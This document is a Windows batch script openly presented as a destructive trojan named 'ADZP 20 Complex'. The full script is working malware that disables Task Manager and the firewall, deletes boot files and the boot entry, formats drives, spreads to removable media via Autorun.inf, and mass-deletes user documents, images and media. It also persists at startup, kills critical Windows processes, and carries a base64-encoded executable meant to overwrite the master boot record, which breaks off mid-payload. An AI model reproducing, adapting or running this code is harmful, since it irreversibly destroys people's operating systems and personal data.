@echo off
::
:: Troyano ADZP 20 Complex - Creado por Dharkon SK.
::
:: Nombre del troyano: ADZP 20 Complex, Shingapi.sk, Twain_20
:: Creador: Dharkon SK
:: Nivel de destruccion: Maximo
::
goto WinMain

:RegistryBlock
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogoff /t REG_DWORD /d 1 /f
netsh advfirewall set allprofiles state off
bcdedit /delete {current}
goto :eof

:DestroyFile
takeown /f "%~1"
icacls "%~1" /reset /c /q
attrib -r -a -s -h "%~1"
del /f /q "%~1"
goto :eof

:DestroyDirectory
takeown /f "%~1" /r
icacls "%~1" /reset /t /c /q
attrib -r -a -s -h "%~1\*.*"
del /f /q /s "%~1\*.*"
goto :eof

:DestroyEx
for /r "%SystemDirectory%" %%z in (*.%~1) do (call :DestroyFile "%%z")
goto :eof

:FormatUnit
if /i "%SystemDrive%" == "%~1:" (goto :eof)
if not exist "%~1:\%~nx0" (format /y /q %~1:) else (
copy %0 "%~1:\%~nx0"
copy Autorun.inf "%~1:\Autorun.inf"
)
goto :eof

:AppFlood
start "" %TROJAN_SCRIPT%
start explorer.exe
if exist "%WINDIR%\notepad.exe" (start notepad)
if exist "%SystemDirectory%\calc.exe" (start calc)
if exist "%SystemDirectory%\mspaint.exe" (start mspaint)
goto :eof

:CrashWindows
powershell wininit
taskkill /im svchost.exe /f
taskkill /im winlogon.exe /f
taskkill /im wininit.exe /f
taskkill /im lsass.exe /f
taskkill /im csrss.exe /f
%SystemDrive%\con\con
\\.\GLOBALROOT\Device\ConDrv\KernelConnect
goto :eof

:WinMain
title ADZP 20 Complex
cd /d "%~dp0"
set TROJAN_SCRIPT=%0
set SystemDirectory=%WINDIR%\System32
color 4
if not exist "ErrorCritico.vbs" (
echo do>>ErrorCritico.vbs
echo Mensaje = MsgBox^(^"Error critico.^",16,^"Error^"^)>>ErrorCritico.vbs
echo loop>>ErrorCritico.vbs
)
if not exist "Advertencia.vbs" (
echo do>>Advertencia.vbs
echo Mensaje = MsgBox^(^"Error en el sistema.^",48,^"Error^"^)>>Advertencia.vbs
echo loop>>Advertencia.vbs
)
if not exist "Informacion.vbs" (
echo do>>Informacion.vbs
echo Mensaje = MsgBox^(^"Has sido hackeado!^",64,^"ADZP 20 Complex^"^)>>Informacion.vbs
echo loop>>Informacion.vbs
)
if not exist "Autorun.inf" (
echo [AutoRun]>>Autorun.inf
echo Open=ADZP 20 Complex>>Autorun.inf
echo Action=Start ADZP 20 Complex>>Autorun.inf
echo Label=???>>Autorun.inf
)
echo off>>Taskse.exe
for /L %%i in (1,1,10) do (
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
)
echo off>>Taskdl.bat
echo @echo off>>Taskdl.bat
echo title Taskdl>>Taskdl.bat
echo color a>>Taskdl.bat
echo takeown /f "C:\Windows\System32" /r>>Taskdl.bat
echo icacls "C:\Windows\System32" /reset /t /c /q>>Taskdl.bat
echo takeown /f "C:\Windows" /r>>Taskdl.bat
echo icacls "C:\Windows" /reset /t /c /q>>Taskdl.bat
echo exit>>Taskdl.bat
start Taskdl.bat
call :DestroyFile "%SystemDirectory%\winresume.exe"
call :DestroyFile "%SystemDirectory%\winload.exe"
call :DestroyFile "%SystemDirectory%\hal.dll"
call :OverWriteMBR
start WScript Informacion.vbs
copy %TROJAN_SCRIPT% "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
rundll32 user32.dll, SetCursorPos
rundll32 user32.dll, SwapMouseButton
ipconfig /release
echo off>>%temp%\EthernetKiller.cmd
echo @echo off>>%temp%\EthernetKiller.cmd
echo ipconfig /release>>%temp%\EthernetKiller.cmd
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v EthernetKill /t REG_SZ /d "%temp%\EthernetKiller.cmd" /f
attrib -r -a -s -h *.*
del /f /q /s *.pdf
del /f /q /s *.rar
del /f /q /s *.png
del /f /q /s *.jpg
del /f /q /s *.txt
del /f /q /s *.log
del /f /q /s *.mp3
del /f /q /s *.mp4
del /f /q /s *.avi
del /f /q /s *.wav
del /f /q /s *.jpeg
del /f /q /s *.docx
del /f /q /s *.xlsx
del /f /q /s *.pptx
start WScript ErrorCritico.vbs
start WScript Advertencia.vbs
start WScript ErrorCritico.vbs
start WScript Advertencia.vbs
start WScript ErrorCritico.vbs
start WScript Advertencia.vbs
start WScript ErrorCritico.vbs
start WScript Advertencia.vbs
start WScript ErrorCritico.vbs
start WScript Advertencia.vbs
call :AppFlood
call :AppFlood
call :AppFlood
call :RegistryBlock
msg * Virus detectado
msg * Virus detectado
msg * Has sido hackeado!
echo %random%%random%%random%>>Virus.exe
echo %random%%random%%random%>>Virus.dll
echo %random%%random%%random%>>Virus.com
echo %random%%random%%random%>>Virus.ini
echo %random%%random%%random%>>Virus.inf
echo %random%%random%%random%>>Virus.sys
echo %random%%random%%random%>>Virus.reg
echo %random%%random%%random%>>Virus.iso
echo %random%%random%%random%>>Virus.bin
echo %random%%random%%random%>>Virus.cmd
echo %random%%random%%random%>>Virus.jar
echo %random%%random%%random%>>Virus.chk
echo %random%%random%%random%>>Virus.lib
echo %random%%random%%random%>>Virus.ocx
echo %random%%random%%random%>>Virus.dat
call :DestroyDirectory "%SystemDirectory%\drivers"
start WScript ErrorCritico.vbs
start WScript Advertencia.vbs
start WScript ErrorCritico.vbs
start WScript Advertencia.vbs
start WScript ErrorCritico.vbs
start WScript Advertencia.vbs
call :AppFlood
call :AppFlood
call :AppFlood
echo %random%%random%%random%>>Virus.cur
echo %random%%random%%random%>>Virus.386
echo %random%%random%%random%>>Virus.scr
echo %random%%random%%random%>>Virus.acm
echo %random%%random%%random%>>Virus.cpl
echo %random%%random%%random%>>Virus.hlp
echo %random%%random%%random%>>Virus.mls
echo %random%%random%%random%>>Virus.zsc
echo %random%%random%%random%>>Virus.vbs
echo %random%%random%%random%>>Virus.drv
echo %random%%random%%random%>>Virus.wsh
echo %random%%random%%random%>>Virus.cer
echo %random%%random%%random%>>Virus.msc
echo %random%%random%%random%>>Virus.db
echo %random%%random%%random%>>Virus.html
call :FormatUnit A
call :FormatUnit B
call :FormatUnit C
call :FormatUnit D
call :FormatUnit E
call :FormatUnit F
call :FormatUnit G
call :FormatUnit H
call :FormatUnit I
call :FormatUnit J
call :FormatUnit K
call :FormatUnit L
call :FormatUnit M
call :DestroyEx ax
call :DestroyEx msc
call :DestroyEx cpl
call :DestroyEx ini
call :DestroyEx bin
call :DestroyEx nls
call :DestroyEx dat
call :DestroyEx ocx
call :DestroyEx drv
call :DestroyEx sys
call :AppFlood
call :AppFlood
call :AppFlood
call :FormatUnit N
call :FormatUnit O
call :FormatUnit P
call :FormatUnit Q
call :FormatUnit R
call :FormatUnit S
call :FormatUnit W
call :FormatUnit X
call :FormatUnit Y
call :FormatUnit Z
if exist "%SystemDrive%\autoexec.bat" (attrib -r -a -s -h "%SystemDrive%\autoexec.bat" & del /s /q /f "%SystemDrive%\autoexec.bat")
if exist "%SystemDrive%\boot.ini" (attrib -r -a -s -h "%SystemDrive%\boot.ini" & del /s /q /f "%SystemDrive%\boot.ini")
if exist "%SystemDrive%\ntldr" (attrib -r -a -s -h "%SystemDrive%\ntldr" & del /s /q /f "%SystemDrive%\ntldr")
if exist "%SystemDrive%\windowswin.ini" (attrib -r -a -s -h "%SystemDrive%\windowswin.ini" & del /s /q /f "%SystemDrive%\windowswin.ini")
if exist "%SystemDrive%\ntdetect.com" (attrib -r -a -s -h "%SystemDrive%\ntdetect.com" & del /s /q /f "%SystemDrive%\ntdetect.com")
echo @echo off>>autoexec.bat
echo del /f /q /s "%WINDIR%\*.*">>autoexec.bat
shutdown -s -t 60 -c "ADZP 20 Complex esta a punto de eliminar el sistema operativo."
start WScript ErrorCritico.vbs
start WScript Advertencia.vbs
start WScript ErrorCritico.vbs
start WScript Advertencia.vbs
call :CrashWindows >NUL 2>NUL
start WScript ErrorCritico.vbs
start WScript Advertencia.vbs
start WScript ErrorCritico.vbs
start WScript Advertencia.vbs
exit

:OverWriteMBR
if exist "Tasksvc.exe" (goto :eof)
for %%a in (
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
